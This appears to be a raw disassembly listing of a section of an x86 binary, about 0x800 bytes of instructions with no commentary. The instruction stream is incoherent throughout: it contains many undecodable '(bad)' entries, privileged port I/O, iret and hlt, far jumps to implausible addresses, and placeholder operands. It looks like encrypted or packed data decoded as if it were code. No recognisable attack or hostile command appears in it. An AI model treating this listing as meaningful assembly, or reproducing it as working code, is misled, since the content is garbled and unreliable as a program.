  41487c:	inc    edi
  41487d:	mov    WORD PTR [eax],?
  41487f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414880:	sqrtps xmm5,XMMWORD PTR [ebx-0x5c]
  414884:	call   0xc0e4f085
  414889:	adc    bl,cl
  41488b:	add    BYTE PTR [edi],al
  41488d:	and    DWORD PTR [edx],ebp
  41488f:	loope  0x41488c
  414891:	jbe    0x414858
  414893:	test   DWORD PTR [edi],ecx
  414895:	test   al,0xe7
  414897:	xchg   ebp,eax
  414898:	test   al,0xf2
  41489a:	mov    ds,WORD PTR [edx+0x57]
  41489d:	xor    eax,0x2fc43ca
  4148a2:	lods   al,BYTE PTR ds:[esi]
  4148a3:	lock mov edx,0x6cbb0d15
  4148a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148aa:	jle    0x414900
  4148ac:	lea    ebp,[eax-0x21]
  4148af:	lock ss add al,0x77
  4148b3:	pusha  
  4148b4:	call   0xad6fb892
  4148b9:	out    dx,al
  4148ba:	lods   al,BYTE PTR ds:[esi]
  4148bb:	lods   eax,DWORD PTR ds:[esi]
  4148bc:	mov    ds:0xe3fe0013,eax
  4148c1:	xor    ebp,edx
  4148c3:	sub    al,0x40
  4148c5:	add    DWORD PTR [eax+0x34369d73],ebx
  4148cb:	mov    al,0xef
  4148cd:	add    BYTE PTR [ebx],al
  4148cf:	data16 mov BYTE PTR [ecx+eax*2-0x7fae733e],bl
  4148d7:	test   al,0x61
  4148d9:	fnsave [ebp+0x155a1aa7]
  4148df:	sub    eax,0xd13dbcc2
  4148e4:	test   al,0x56
  4148e6:	cwde   
  4148e7:	lods   eax,DWORD PTR ds:[esi]
  4148e8:	and    al,0x97
  4148ea:	(bad)  
  4148eb:	and    eax,0xcfb97d3f
  4148f0:	in     al,0xc4
  4148f2:	popf   
  4148f3:	pop    es
  4148f4:	inc    ecx
  4148f5:	dec    ebx
  4148f6:	nop
  4148f7:	int3   
  4148f8:	mov    ebp,0x55ef4c20
  4148fd:	dec    ebx
  4148fe:	shl    DWORD PTR [edx-0x71],1
  414901:	in     eax,0xad
  414903:	and    al,0xed
  414905:	push   cs
  414906:	scas   eax,DWORD PTR es:[edi]
  414907:	mov    BYTE PTR cs:[ebx],bl
  41490a:	das    
  41490b:	mov    dh,0x81
  41490d:	push   ds
  41490e:	mov    ch,0x1a
  414910:	jmp    0x70f69bee
  414915:	test   eax,0xe8eacb1a
  41491a:	cmp    eax,0x79b26324
  41491f:	in     eax,dx
  414920:	add    al,0xd2
  414922:	sbb    edx,eax
  414924:	lahf   
  414925:	add    al,BYTE PTR [edi-0x36da6f4b]
  41492b:	test   eax,0xcf2e4cd7
  414930:	lods   al,BYTE PTR ds:[esi]
  414931:	push   edx
  414932:	dec    edx
  414933:	mov    ss,WORD PTR [ecx+0x5b]
  414936:	lahf   
  414937:	lods   al,BYTE PTR ds:[esi]
  414938:	mov    eax,0x316180fb
  41493d:	jmp    0x70db:0xfa39ede5
  414944:	mov    ch,0x31
  414946:	sbb    BYTE PTR [ebp+edi*1+0x5905d4d9],cl
  41494d:	fwait
  41494e:	xchg   esp,eax
  41494f:	in     al,dx
  414950:	or     BYTE PTR [esi+0x476acb05],bh
  414956:	ins    DWORD PTR es:[edi],dx
  414957:	out    dx,al
  414958:	cmp    dh,BYTE PTR [eax+0x5d]
  41495b:	adc    DWORD PTR [edi],ebp
  41495d:	out    0x5b,al
  41495f:	push   0xffffff8c
  414961:	jl     0x414912
  414963:	jmp    0x4148e7
  414965:	test   eax,esp
  414967:	or     BYTE PTR [ebp-0x25],al
  41496a:	mov    al,ds:0x26432660
  41496f:	ins    BYTE PTR es:[edi],dx
  414970:	push   ecx
  414971:	iret   
  414972:	test   DWORD PTR [ecx],edi
  414974:	jle    0x4149ce
  414976:	lds    edx,FWORD PTR ds:0x5989dc43
  41497c:	mov    BYTE PTR [ebp-0x69],dh
  41497f:	mov    eax,ds:0x75b04626
  414984:	int3   
  414985:	pop    ebx
  414986:	jp     0x4149f7
  414988:	in     eax,0x5c
  41498a:	xchg   ecx,eax
  41498b:	cdq    
  41498c:	mov    edx,0xccc61c0
  414991:	inc    esi
  414992:	stc    
  414993:	cli    
  414994:	sar    DWORD PTR [ecx+0x2693798f],cl
  41499a:	jge    0x414a14
  41499c:	mov    BYTE PTR [edx+0x76299bcf],cl
  4149a2:	sbb    BYTE PTR [eax-0x7ec63f49],ch
  4149a8:	and    bl,BYTE PTR [edi-0x51]
  4149ab:	cwde   
  4149ac:	add    ecx,edi
  4149ae:	mov    ds:0x11e120d8,eax
  4149b3:	push   0x1e484109
  4149b8:	push   0x9f5923a0
  4149bd:	iret   
  4149be:	mov    al,BYTE PTR [edx]
  4149c0:	call   0x2729aa8c
  4149c5:	fimul  WORD PTR [ebx-0x10]
  4149c8:	in     eax,dx
  4149c9:	in     al,0xf
  4149cb:	pop    ds
  4149cc:	pop    esp
  4149cd:	xor    DWORD PTR [ebx],esi
  4149cf:	rol    DWORD PTR [ebx-0x19],cl
  4149d2:	mov    al,ds:0x62e4d3e4
  4149d7:	aaa    
  4149d8:	rcl    DWORD PTR [eax+edi*1-0x6f],1
  4149dc:	fsubr  st(5),st
  4149de:	and    BYTE PTR [ebp+0x20],ah
  4149e1:	pop    ebx
  4149e2:	ja     0x4149ad
  4149e4:	fwait
  4149e5:	pop    esi
  4149e6:	bound  edi,QWORD PTR [edi]
  4149e8:	or     BYTE PTR ds:0xad92633d,cl
  4149ee:	jge    0x414a61
  4149f0:	call   0x6d08:0x1bda6a7d
  4149f7:	shl    edx,1
  4149f9:	imul   eax,DWORD PTR [esi+edi*2+0x62],0xe0d18901
  414a01:	jmp    0x9ea7553a
  414a06:	dec    ecx
  414a07:	sbb    ah,ch
  414a09:	les    esi,FWORD PTR [eax]
  414a0b:	and    edx,DWORD PTR [esi+eax*4-0x1f3637a2]
  414a12:	test   BYTE PTR [ecx],al
  414a14:	mov    BYTE PTR [edx+edi*1],bl
  414a17:	sub    eax,0x8433aab
  414a1c:	jp     0x414a77
  414a1e:	push   cs
  414a1f:	in     eax,0x65
  414a21:	jp     0x414a64
  414a23:	push   0x67
  414a25:	(bad)  
  414a26:	mov    eax,gs
  414a28:	mov    ?,WORD PTR [edi-0x6e]
  414a2b:	call   0x1cc0e3f3
  414a30:	dec    ecx
  414a31:	sub    dl,bh
  414a33:	shl    DWORD PTR [ecx],cl
  414a35:	test   al,0x47
  414a37:	aas    
  414a38:	mov    BYTE PTR [edi+edi*2],al
  414a3b:	jp     0x414aa2
  414a3d:	pop    ebp
  414a3e:	iret   
  414a3f:	ds push ebp
  414a41:	and    al,0x87
  414a43:	mov    ch,0x53
  414a45:	fldcw  WORD PTR [ebx]
  414a47:	xor    eax,0x36ea8c77
  414a4c:	cdq    
  414a4d:	ror    DWORD PTR [ecx-0x54],1
  414a50:	retf   0x57a4
  414a53:	xor    cl,al
  414a55:	stos   DWORD PTR es:[edi],eax
  414a56:	and    eax,0xc383188e
  414a5b:	and    BYTE PTR ds:0x99f9d4d9,cl
  414a61:	mov    DWORD PTR [edi+eiz*4],edi
  414a64:	jecxz  0x414aad
  414a66:	aas    
  414a67:	jg     0x414aa2
  414a69:	xor    DWORD PTR gs:[ebp-0x25],edi
  414a6d:	xor    eax,0xe01d6781
  414a72:	jo     0x414a7d
  414a74:	arpl   WORD PTR [esp+edi*4-0x753adad2],sp
  414a7b:	pop    ebx
  414a7c:	inc    ebp
  414a7d:	jmp    0x7500:0x7b6b57fb
  414a84:	sub    bh,BYTE PTR [ebx+0x1bda35f2]
  414a8a:	mov    bh,0x4c
  414a8c:	mov    al,0x27
  414a8e:	push   es
  414a8f:	sbb    ch,BYTE PTR [edi]
  414a91:	std    
  414a92:	mov    eax,ds:0x92505c5d
  414a97:	mov    ch,0x34
  414a99:	xlat   BYTE PTR ds:[ebx]
  414a9a:	stc    
  414a9b:	mov    dl,0xb7
  414a9d:	push   0xd86001c2
  414aa2:	mov    esi,DWORD PTR [ebp-0x5ad5fc65]
  414aa8:	jbe    0x414ad6
  414aaa:	and    DWORD PTR [edi],ecx
  414aac:	and    esp,DWORD PTR [edi-0x47]
  414aaf:	(bad)  
  414ab0:	loope  0x414acb
  414ab2:	test   al,0x76
  414ab4:	add    eax,0xb9ded28e
  414ab9:	sub    eax,0x8cea8e57
  414abe:	xlat   BYTE PTR ds:[ebx]
  414abf:	arpl   WORD PTR [eax],cx
  414ac1:	fild   QWORD PTR [edx+0x67a10a82]
  414ac7:	mov    ch,0x88
  414ac9:	out    0x47,al
  414acb:	bound  ecx,QWORD PTR ds:0xfef124fd
  414ad1:	imul   eax,DWORD PTR [ecx+edi*1],0xffffffb6
  414ad5:	push   ebx
  414ad6:	mov    dh,0xbc
  414ad8:	xor    eax,0xa6ec1e57
  414add:	adc    esi,DWORD PTR [ebx-0x9dc278b]
  414ae3:	xchg   ebp,eax
  414ae4:	bound  ebp,QWORD PTR ds:0xab9df353
  414aea:	std    
  414aeb:	xor    cl,bh
  414aed:	or     al,0xcc
  414aef:	xchg   ebp,eax
  414af0:	icebp  
  414af1:	mov    edx,0x89e9e4d3
  414af6:	sbb    eax,DWORD PTR [edx]
  414af8:	fisub  DWORD PTR [ebx]
  414afa:	cmp    bh,al
  414afc:	(bad)
  414aff:	push   0xd4cb676b
  414b04:	dec    edi
  414b05:	mov    cs,WORD PTR [esi+0x40717b61]
  414b0b:	ds jg  0x414aca
  414b0e:	jne    0x414b54
  414b10:	adc    ch,BYTE PTR [eax-0x18dcfd6a]
  414b16:	or     ebp,DWORD PTR [ebp+edi*4-0x46]
  414b1a:	cmp    dh,BYTE PTR [eax+eax*8]
  414b1d:	add    bl,ah
  414b1f:	push   ds
  414b20:	je     0x414ab5
  414b22:	out    0xd,eax
  414b24:	sbb    BYTE PTR [eax-0x1163830d],al
  414b2a:	dec    eax
  414b2b:	push   ss
  414b2c:	dec    esp
  414b2d:	or     ch,ch
  414b2f:	jp     0x414abd
  414b31:	repz leave 
  414b33:	cmp    BYTE PTR [ecx],0x7d
  414b36:	add    al,0x5f
  414b38:	and    ecx,0x122c6fe8
  414b3e:	push   ebx
  414b3f:	shr    DWORD PTR [eax],1
  414b41:	test   eax,0x70e57b43
  414b46:	mov    dl,0xa5
  414b48:	pop    ebp
  414b49:	jge    0x414b9b
  414b4b:	(bad)
  414b4f:	test   DWORD PTR [eax-0xa],eax
  414b52:	mov    ecx,edx
  414b54:	imul   ecx,esi,0x421890a6
  414b5a:	dec    ecx
  414b5b:	cmp    BYTE PTR [ebp-0x3e],0xdf
  414b5f:	mov    ch,0x45
  414b62:	sbb    al,0xca
  414b64:	shl    DWORD PTR [edi+ebp*1-0xabe7ab4],1
  414b6b:	mov    esi,DWORD PTR [eax-0x5e]
  414b6e:	retf   
  414b6f:	adc    ebx,DWORD PTR [edx-0x75]
  414b72:	(bad)  
  414b73:	clc    
  414b74:	jnp    0x414b24
  414b76:	or     al,0x10
  414b78:	dec    ebx
  414b79:	clc    
  414b7a:	push   ecx
  414b7b:	adc    esi,esp
  414b7d:	jp     0x414be9
  414b7f:	retf   0x7c8f
  414b82:	cmp    dl,BYTE PTR [esi+0x14]
  414b85:	push   edx
  414b86:	jmp    0x414bc7
  414b88:	cmp    edx,DWORD PTR [ebx+edx*2-0x19]
  414b8c:	popa   
  414b8d:	pop    ebp
  414b8e:	imul   DWORD PTR [eax]
  414b90:	sub    ch,BYTE PTR [ebx]
  414b92:	push   0xfe94979f
  414b97:	jae    0x414b7f
  414b99:	lods   al,BYTE PTR ds:[esi]
  414b9a:	and    eax,0xd1e66e32
  414b9f:	es popa 
  414ba1:	jge    0x414b31
  414ba3:	fwait
  414ba4:	enter  0xda6b,0x55
  414ba8:	lods   al,BYTE PTR ds:[esi]
  414ba9:	sahf   
  414baa:	xchg   ecx,eax
  414bab:	inc    eax
  414bac:	dec    esi
  414bad:	mov    cl,0x17
  414baf:	and    ebp,ecx
  414bb1:	sub    eax,DWORD PTR [ebx-0x4d87bd39]
  414bb7:	sti    
  414bb8:	sbb    al,0x9e
  414bba:	sbb    edx,0xa55ed54b
  414bc0:	push   esp
  414bc1:	dec    eax
  414bc2:	hlt    
  414bc3:	push   cs
  414bc4:	std    
  414bc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bc6:	inc    eax
  414bc7:	sub    bh,BYTE PTR [ebp+0x657e43a6]
  414bcd:	popf   
  414bce:	xor    eax,0x66e608d0
  414bd3:	test   BYTE PTR [edx+esi*1-0x50],ch
  414bd7:	outs   dx,BYTE PTR ds:[esi]
  414bd8:	cmp    ah,dl
  414bda:	dec    ebx
  414bdb:	in     al,0x3a
  414bdd:	mov    ds:0x417cf6a0,eax
  414be2:	aam    0xdb
  414be4:	lds    esp,FWORD PTR [edi-0x55625622]
  414bea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414beb:	sub    eax,0x8bf72ce
  414bf0:	repnz pop ecx
  414bf2:	fnstcw WORD PTR [ebp-0xc]
  414bf5:	popa   
  414bf6:	scas   al,BYTE PTR es:[edi]
  414bf7:	xor    esi,edi
  414bf9:	adc    al,0xe4
  414bfb:	ficomp DWORD PTR [ebp+edi*2-0x6b]
  414bff:	fsub   QWORD PTR [ebp-0xe]
  414c02:	neg    ebp
  414c04:	and    DWORD PTR [esp+ecx*1],eax
  414c07:	sar    BYTE PTR [ecx],1
  414c09:	or     edi,DWORD PTR [edi+ebx*4-0x7b54ba84]
  414c10:	xor    eax,0xdec9e5bd
  414c15:	push   DWORD PTR [esi+0x6b]
  414c18:	stc    
  414c19:	jl     0x414c8b
  414c1b:	aam    0xca
  414c1d:	mul    BYTE PTR [edi+ebx*4]
  414c20:	mov    edx,0x22ccb145
  414c25:	stos   DWORD PTR es:[edi],eax
  414c26:	(bad)  [ecx+0x20b52b78]
  414c2c:	cld    
  414c2d:	cli    
  414c2e:	xchg   ecx,eax
  414c2f:	jnp    0x414c34
  414c31:	daa    
  414c32:	inc    edx
  414c33:	or     ch,bl
  414c35:	xchg   edx,eax
  414c36:	sbb    al,0xe2
  414c38:	pop    esp
  414c39:	rcr    DWORD PTR [edi+0x24],0xcd
  414c3d:	(bad)  
  414c3e:	xchg   ecx,eax
  414c3f:	jbe    0x414c34
  414c41:	es aas 
  414c43:	sub    eax,0x4afe871
  414c48:	add    DWORD PTR [ebx],ebp
  414c4a:	daa    
  414c4b:	(bad)  
  414c4c:	aas    
  414c4d:	enter  0x4b53,0xb6
  414c51:	repnz pop eax
  414c53:	push   0x81b73e5d
  414c58:	mov    ah,0x49
  414c5a:	xchg   ecx,eax
  414c5c:	mov    cl,0x89
  414c5e:	add    al,0x4
  414c60:	stc    
  414c61:	push   ss
  414c62:	sub    ebp,DWORD PTR [esi+ebx*4+0x48]
  414c66:	jl     0x414bff
  414c68:	jp     0x414bf3
  414c6a:	fs pop ds
  414c6c:	pop    ebx
  414c6d:	xchg   edx,eax
  414c6e:	and    BYTE PTR [ebx-0x18b0efe6],0xdb
  414c75:	mov    ?,eax
  414c77:	loopne 0x414ced
  414c79:	in     eax,dx
  414c7a:	jmp    0xb3b36365
  414c7f:	pushf  
  414c80:	xor    BYTE PTR [edi],0x46
  414c83:	mov    esp,DWORD PTR ds:0xe2107bbf
  414c89:	call   0x8fbb:0x98d6e34f
  414c90:	mov    esp,0xf554a37b
  414c95:	mov    cl,0xce
  414c97:	dec    ecx
  414c98:	sbb    ebx,ebx
  414c9a:	test   DWORD PTR [ebx],0x98b0337d
  414ca0:	add    al,0x9f
  414ca2:	or     eax,0x28184d2e
  414ca7:	aad    0x5b
  414ca9:	fmulp  st(3),st
  414cab:	sar    DWORD PTR [esi+0x78],cl
  414cae:	sub    al,0x5b
  414cb0:	pop    ss
  414cb1:	xchg   ebp,eax
  414cb2:	push   es
  414cb3:	jmp    0x8037:0x8289a8c
  414cba:	mov    ds:0xff29c5d6,al
  414cbf:	shr    BYTE PTR [edi],0xbe
  414cc2:	rol    ah,cl
  414cc4:	test   DWORD PTR [ebp+0x1b],ecx
  414cc7:	rcr    DWORD PTR [ecx-0x118747f4],1
  414ccd:	sub    eax,0xefa06233
  414cd2:	cmp    dl,0x82
  414cd5:	fcmovne st,st(0)
  414cd7:	pop    ss
  414cd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cd9:	sti    
  414cda:	call   0x7e013593
  414cdf:	push   ds
  414ce0:	nop/reserved BYTE PTR ds:0x5b24fad8
  414ce7:	mov    cl,0x34
  414ce9:	lods   al,BYTE PTR ds:[esi]
  414cea:	sub    eax,0xa9dde535
  414cef:	js     0x414cad
  414cf1:	xor    esp,DWORD PTR [edi-0x7e4eb96e]
  414cf7:	fsubr  QWORD PTR ds:0x2ea80c51
  414cfd:	cmp    BYTE PTR [esi],0x1a
  414d00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d01:	gs cwde 
  414d03:	fiadd  WORD PTR [ebp-0x4d]
  414d06:	aam    0xa
  414d08:	cmp    al,0xde
  414d0a:	xlat   BYTE PTR ds:[ebx]
  414d0b:	pop    edi
  414d0c:	push   eax
  414d0d:	sub    al,0x31
  414d10:	sub    al,0xc5
  414d12:	mov    ecx,0x52f22d3d
  414d17:	adc    esi,esp
  414d19:	fwait
  414d1a:	sbb    esi,eax
  414d1c:	sub    BYTE PTR [ecx-0x1b],dl
  414d1f:	data16 jecxz 0x414d1e
  414d22:	fidivr WORD PTR [ebx+ebx*1-0x79]
  414d26:	push   0xffffff82
  414d28:	xor    dh,BYTE PTR [ebp-0x47755aec]
  414d2e:	adc    DWORD PTR [esi+0x7c6388c7],0xdfc4602c
  414d38:	inc    ebx
  414d39:	jmp    0x417fd924
  414d3e:	imul   edi,DWORD PTR [eax+eax*1+0x7274fbdb],0xba5830a5
  414d49:	pop    esp
  414d4a:	pop    esp
  414d4b:	jecxz  0x414cf2
  414d4d:	pop    edx
  414d4e:	xchg   esi,eax
  414d4f:	(bad)  
  414d50:	lods   eax,DWORD PTR ds:[esi]
  414d51:	add    eax,esi
  414d53:	outs   dx,BYTE PTR ds:[esi]
  414d54:	aaa    
  414d55:	pop    edi
  414d56:	mov    eax,0x68063882
  414d5b:	mov    edi,0x9a3a571
  414d60:	mov    cl,0x42
  414d62:	jge    0x414d22
  414d64:	scas   al,BYTE PTR es:[edi]
  414d65:	aaa    
  414d66:	push   ebx
  414d67:	loop   0x414d13
  414d69:	add    BYTE PTR [esi-0x23],0x55
  414d6d:	jge    0x414d63
  414d6f:	jns    0x414d77
  414d71:	dec    esp
  414d72:	cmp    ebx,edi
  414d74:	test   al,0xc2
  414d76:	mov    cl,0x69
  414d78:	xchg   ebx,eax
  414d79:	sub    DWORD PTR [edi],ebx
  414d7b:	sbb    DWORD PTR [edi+ebp*8-0x70818ac7],ebp
  414d82:	ins    BYTE PTR es:[edi],dx
  414d83:	pop    ebp
  414d84:	xchg   ebx,eax
  414d85:	mov    ecx,0x9ec705eb
  414d8a:	mov    ah,0xd9
  414d8c:	jns    0x414d7c
  414d8e:	add    BYTE PTR ds:0xc66ee6d5,dl
  414d94:	aam    0xad
  414d96:	pop    esp
  414d97:	or     BYTE PTR [edi-0x45],0xf
  414d9b:	aas    
  414d9c:	adc    al,0xca
  414d9e:	ss out 0x1b,eax
  414da1:	add    al,0x71
  414da3:	pop    ebx
  414da4:	inc    ecx
  414da5:	jle    0x414d50
  414da7:	adc    DWORD PTR [edx-0x11],0xffffffde
  414dab:	in     al,dx
  414dac:	adc    dh,dh
  414dae:	inc    esp
  414daf:	pusha  
  414db0:	ss inc edi
  414db2:	cli    
  414db3:	push   ds
  414db4:	scas   al,BYTE PTR es:[edi]
  414db5:	pop    esp
  414db6:	cmp    BYTE PTR [esi],bh
  414db8:	test   DWORD PTR [ecx],ebp
  414dba:	sar    BYTE PTR [eax+esi*2-0x3d888daf],0x75
  414dc2:	out    0xab,al
  414dc4:	xchg   ecx,eax
  414dc5:	mov    DWORD PTR [ecx-0x7b],esp
  414dc8:	or     bh,BYTE PTR [edi+ebx*2+0x17]
  414dcc:	jae    0x414dee
  414dce:	sub    ah,0xea
  414dd1:	into   
  414dd2:	push   0x239b7713
  414dd7:	or     al,bh
  414dd9:	add    al,0x2b
  414ddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ddc:	push   0x345ea1c3
  414de1:	sbb    al,0xe8
  414de3:	push   ecx
  414de4:	push   0xffffffb7
  414de6:	cli    
  414de7:	in     al,0x5b
  414de9:	dec    edx
  414dea:	lahf   
  414deb:	in     al,0xe2
  414ded:	pop    esi
  414dee:	out    dx,eax
  414def:	(bad)  
  414df0:	outs   dx,DWORD PTR ds:[esi]
  414df1:	shr    DWORD PTR [esp+edx*1],0x72
  414df5:	dec    esi
  414df6:	imul   eax,DWORD PTR [esp+ebx*1+0x44fc1bf5],0xe1e26d7c
  414e01:	call   0x360a3e4c
  414e06:	stos   DWORD PTR es:[edi],eax
  414e07:	mov    WORD PTR [ebx],fs
  414e09:	dec    ebp
  414e0a:	xor    ecx,0x3692be0c
  414e10:	fcom   QWORD PTR [esp+ecx*1-0x7a6c51f6]
  414e17:	push   ebx
  414e18:	loopne 0x414e8b
  414e1a:	sbb    ch,BYTE PTR [esi-0x5c]
  414e1d:	ret    0xdd89
  414e20:	lods   eax,DWORD PTR ds:[esi]
  414e21:	push   eax
  414e22:	pop    edi
  414e23:	stos   BYTE PTR es:[edi],al
  414e24:	pop    ss
  414e25:	mov    ds,WORD PTR [edx+eiz*2-0x314b6771]
  414e2c:	pop    ebx
  414e2d:	retf   
  414e2e:	xor    DWORD PTR [edi+0x2a7413fc],0x5ef0eee1
  414e38:	leave  
  414e39:	hlt    
  414e3a:	xor    DWORD PTR [edx],edx
  414e3c:	inc    ebp
  414e3d:	aaa    
  414e3e:	push   edx
  414e3f:	xor    dh,dh
  414e41:	cmp    eax,0xa2d39a5a
  414e46:	inc    ebx
  414e47:	adc    al,0xf4
  414e49:	jns    0x414e38
  414e4b:	lock test DWORD PTR [ebp+0x64187742],esp
  414e52:	xchg   esp,eax
  414e53:	jmp    0x71fd:0x4a2f00ee
  414e5a:	and    ebx,DWORD PTR [eax]
  414e5c:	add    eax,0xa47a3973
  414e61:	push   edx
  414e62:	xchg   esp,eax
  414e63:	scas   al,BYTE PTR es:[edi]
  414e64:	sub    al,0x7e
  414e66:	rcr    dh,cl
  414e68:	sub    cl,BYTE PTR [ebx]
  414e6a:	loop   0x414e79
  414e6c:	dec    eax
  414e6d:	ja     0x414df9
  414e6f:	in     eax,0xca
  414e71:	mov    al,ds:0x8fededfe
  414e76:	and    dl,BYTE PTR [eax]
  414e78:	scas   eax,DWORD PTR es:[edi]
  414e79:	jecxz  0x414ea8
  414e7b:	and    dh,0xb1
  414e7e:	push   edx
  414e7f:	dec    ebp
  414e80:	sbb    eax,0xd7130ef7
  414e85:	icebp  
  414e86:	outs   dx,DWORD PTR ds:[esi]
  414e87:	sub    DWORD PTR [ebx+0x40],ecx
  414e8a:	pop    ds
  414e8b:	outs   dx,BYTE PTR ds:[esi]
  414e8c:	or     DWORD PTR [ebp+0x19b89c74],ebx
  414e92:	inc    ebx
  414e93:	in     eax,dx
  414e94:	fcmovbe st,st(7)
  414e96:	mov    ecx,0x6019fedf
  414e9b:	rcr    ebp,0x60
  414e9e:	jecxz  0x414ee2
  414ea0:	sahf   
  414ea1:	push   ecx
  414ea2:	aam    0xfd
  414ea4:	les    ecx,FWORD PTR [ebp+0x2f3645e6]
  414eaa:	(bad)  [ebx-0x4d]
  414ead:	out    0x5e,al
  414eaf:	dec    ebp
  414eb0:	jle    0x414e3f
  414eb2:	sbb    BYTE PTR [esp+ebx*1+0x3b83a5cb],cl
  414eb9:	xchg   ecx,eax
  414eba:	inc    ecx
  414ebb:	seta   ah
  414ebe:	or     DWORD PTR [ebp+edi*8+0x3c],esi
  414ec2:	xor    edi,DWORD PTR [ebx]
  414ec4:	jmp    0x414ea5
  414ec6:	xchg   edx,eax
  414ec7:	push   eax
  414ec8:	in     eax,0x59
  414eca:	add    DWORD PTR [edi+ebx*1-0xebec754],edi
  414ed1:	push   ss
  414ed2:	mov    ecx,0x3e16686
  414ed7:	xchg   ebx,eax
  414ed8:	bound  edi,QWORD PTR gs:[eax-0x7]
  414edc:	add    al,0xe7
  414ede:	jg     0x414ec0
  414ee0:	mov    esp,0x686db3b4
  414ee5:	mov    ecx,0x3c6e66ae
  414eea:	jmp    FWORD PTR [edx-0x54a8a49d]
  414ef0:	jmp    0x8f93:0x9b1523b8
  414ef7:	gs dec edx
  414ef9:	mov    BYTE PTR [ebp-0xe],bl
  414efc:	pop    eax
  414efd:	dec    edx
  414efe:	enter  0x8c8e,0x2d
  414f02:	push   ebp
  414f03:	cmc    
  414f04:	sbb    BYTE PTR [esi+eiz*4+0x7726cfe0],al
  414f0b:	pusha  
  414f0c:	push   es
  414f0d:	sub    eax,DWORD PTR [eax+0x15e3f7e1]
  414f13:	fstp   TBYTE PTR [ebp+0xa989a13]
  414f19:	loopne 0x414f8d
  414f1b:	push   ss
  414f1c:	push   es
  414f1d:	test   eax,edi
  414f1f:	fidivr DWORD PTR [ebp-0x77]
  414f22:	outs   dx,DWORD PTR ds:[esi]
  414f23:	retf   
  414f24:	lods   al,BYTE PTR ds:[esi]
  414f25:	mov    ds:0x50d7ee6,eax
  414f2a:	cmp    ebp,DWORD PTR [edi+0x31]
  414f2d:	push   0xe7387ffb
  414f32:	xor    ch,dl
  414f34:	mov    al,ds:0x4312c93e
  414f39:	mov    esp,0xc1892a97
  414f3e:	fbstp  TBYTE PTR [ecx+0xe]
  414f41:	and    al,0xb3
  414f43:	sbb    dh,BYTE PTR [edx+edi*8]
  414f46:	cmp    dl,BYTE PTR [esp+eax*1+0x5e69db4e]
  414f4d:	ror    DWORD PTR [ecx-0x527ba9b2],1
  414f53:	adc    ecx,DWORD PTR [esi+0x1e]
  414f56:	and    bl,BYTE PTR [esi]
  414f58:	test   ch,bl
  414f5a:	cmp    eax,0xa4a3b4f1
  414f5f:	pop    eax
  414f60:	es cmp al,0xc9
  414f63:	mov    esp,0x16364c5
  414f68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f6a:	adc    ah,BYTE PTR [edi-0x70]
  414f6d:	mov    dh,0x1f
  414f6f:	ret    
  414f70:	jnp    0x414fee
  414f72:	mov    cl,0xfe
  414f74:	test   eax,0x36a7b157
  414f79:	add    al,0x4e
  414f7b:	retf   0xd1cc
  414f7e:	cdq    
  414f7f:	inc    ebp
  414f80:	nop
  414f81:	sub    BYTE PTR [ebx],ah
  414f83:	mov    al,ds:0xda79d215
  414f88:	f2xm1  
  414f8a:	sbb    dh,BYTE PTR ds:0xab9377fb
  414f90:	leave  
  414f91:	scas   eax,DWORD PTR es:[edi]
  414f92:	dec    ebx
  414f93:	jns    0x414fde
  414f95:	xor    eax,DWORD PTR [esi]
  414f97:	jl     0x41500d
  414f99:	push   edi
  414f9a:	std    
  414f9b:	mov    dl,al
  414f9d:	or     BYTE PTR [ecx],bl
  414f9f:	jl     0x414fe4
  414fa1:	ret    0x6cfa
  414fa4:	fcmovne st,st(6)
  414fa6:	sti    
  414fa7:	sbb    edx,DWORD PTR [edi-0x4d]
  414faa:	nop
  414fab:	in     al,0xc0
  414fad:	leave  
  414fae:	inc    eax
  414faf:	in     eax,dx
  414fb0:	les    ecx,FWORD PTR ds:0xe8c9b7a0
  414fb6:	pop    esi
  414fb7:	dec    edi
  414fb8:	call   0xa968a164
  414fbd:	lods   eax,DWORD PTR ds:[esi]
  414fbe:	add    BYTE PTR [ebx+0x35a8c47d],al
  414fc4:	retf   0x6c2b
  414fc7:	xchg   BYTE PTR ds:0xd46998a6,dl
  414fcd:	cld    
  414fce:	pop    esp
  414fcf:	sbb    dh,BYTE PTR [esi+0x52]
  414fd2:	push   edx
  414fd3:	(bad)  [eax]
  414fd5:	test   BYTE PTR [edi+0x2ba704e1],cl
  414fdb:	pop    edi
  414fdc:	adc    ch,BYTE PTR ds:0xe5c1f69f
  414fe2:	pop    edx
  414fe3:	mov    ch,0xf1
  414fe5:	push   0x6b
  414fe7:	cmp    al,BYTE PTR [ebx-0x7c844721]
  414fed:	(bad)  
  414fee:	aas    
  414fef:	sbb    DWORD PTR es:[ecx-0x42],ebx
  414ff3:	fisttp DWORD PTR [ecx+0x7b36551f]
  414ff9:	mov    dl,0xd2
  414ffb:	dec    edx
  414ffc:	clc    
  414ffd:	cmp    bh,BYTE PTR [edi]
  414fff:	mov    ch,0x2
  415001:	leave  
  415002:	mov    edi,0xc79de40e
  415007:	jne    0x415028
  415009:	jmp    0x510f:0x4be870bd
  415010:	sub    BYTE PTR [esi+0x7a46706c],ah
  415016:	add    dh,cl
  415018:	gs mov esi,0xf2f7f08e
  41501e:	test   DWORD PTR [eax+ebp*8-0x2e],edx
  415022:	inc    ebx
  415023:	jp     0x414fb3
  415025:	jge    0x415042
  415027:	inc    esp
  415028:	add    al,0x2e
  41502a:	fldcw  WORD PTR [eax+0x3e19514f]
  415030:	mov    ebp,0x713ebff9
  415035:	sub    BYTE PTR [edi+0x40ea3779],bh
  41503b:	dec    ebx
  41503c:	es pop esi
  41503e:	push   ebx
  41503f:	outs   dx,BYTE PTR ds:[esi]
  415040:	scas   eax,DWORD PTR es:[edi]
  415041:	fdivr  st(3),st
  415043:	(bad)  
  415044:	ret    0x4900
  415047:	into   
  415048:	rcr    BYTE PTR ds:0xce14b6fd,1
  41504e:	inc    ecx
  41504f:	nop
  415050:	xchg   esi,eax
  415051:	push   esi
  415052:	jmp    0x2b67:0x950f0ee9
